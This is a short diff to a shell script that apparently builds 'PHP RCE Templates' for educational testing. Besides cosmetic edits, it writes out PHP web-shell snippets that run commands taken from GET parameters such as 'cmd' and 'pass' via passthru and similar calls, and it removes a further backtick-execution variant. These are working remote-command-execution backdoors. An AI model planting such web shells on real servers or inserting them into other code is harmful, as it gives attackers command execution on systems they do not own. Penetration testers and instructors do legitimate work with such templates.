@@ -25,7 +25,7 @@ error() {
 }
 
 section() {
-    echo -e "\n${CYAN}[ $1 ]${NC}"
+    echo -e "${CYAN}[ $1 ]${NC}"
 }
 
 # ---
@@ -131,7 +131,7 @@ success "HTML template created"
 # PHP RCE Templates (Educational Testing)
 section "Creating PHP RCE Templates"
 
-cat > "$TEMPLATES_DIR/php_rce_scripts.sh" << 'EOF_PHP_RCE'
+cat > "$TEMPLATES_DIR/php_rce_scripts.sh" << 'EOF_SH_RCE'
 echo "
 <?php
 if(isset(\$_GET['cmd'])) {
@@ -148,12 +148,6 @@ if(isset(\$_GET['exec'])) {
 <?php
 if(isset(\$_GET['pass'])) {
   passthru(\$_GET['pass']);
-}
-?>
-
-<?php
-if(isset(\$_GET['back'])) {
-  echo `{\$_GET['back']}`;
 }
 ?>
 "
